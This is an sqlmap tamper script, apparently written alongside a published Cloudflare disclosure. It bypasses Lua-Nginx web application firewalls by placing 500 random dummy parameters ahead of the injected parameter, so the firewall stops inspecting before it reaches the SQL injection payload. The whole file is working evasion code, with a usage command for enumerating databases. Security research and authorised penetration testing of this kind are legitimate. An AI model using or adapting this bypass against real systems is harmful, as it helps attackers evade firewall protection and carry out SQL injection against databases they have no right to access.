#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
[+] LUA-Nginx WAFs Bypass (Cloudflare)
Vulnerability discovered by: Daniel Fariña Hernández
Tamper created by: Jennifer Torres Fernández (@j4ckmln)

Lua-Nginx WAFs doesn't support processing for more than 100 parameters.

Open Data Security (@ODSops) [https://ods.es]
PoC: https://www.youtube.com/watch?v=JUvro7cqidY
Vulnerability information: https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/

Example: sqlmap -r file.txt --tamper=luanginxwafbypass.py --dbs --skip-urlencode
'''

import sys
import string
import random
from lib.core.enums import PRIORITY
from lib.core.data import conf
__priority__ = PRIORITY.HIGHEST

''' Random parameter'''
def randomParameterGenerator(size=6, chars=string.ascii_uppercase + string.digits):
    output = ''.join(random.choice(chars) for _ in range(size))
    return output

''' [Tamper] LUA-Nginx WAFs Bypass '''
def tamper(payload, **kwargs):
    try:
        headers = kwargs.get("headers", {})
        randomParameter = randomParameterGenerator()
        parameter = conf["testParameter"]

        if conf["skipUrlEncode"] != True:
            print "\n[-] [ERROR] --skip-urlencode option must be activated"
            sys.exit(0)

        # Add 500 parameters to payload
        luaBypass = ("&" + randomParameter + "=")*500 + "&"
        outputPayload = luaBypass + parameter + "=" + payload

        return outputPayload
    except Exception as error:
        print error
        return None
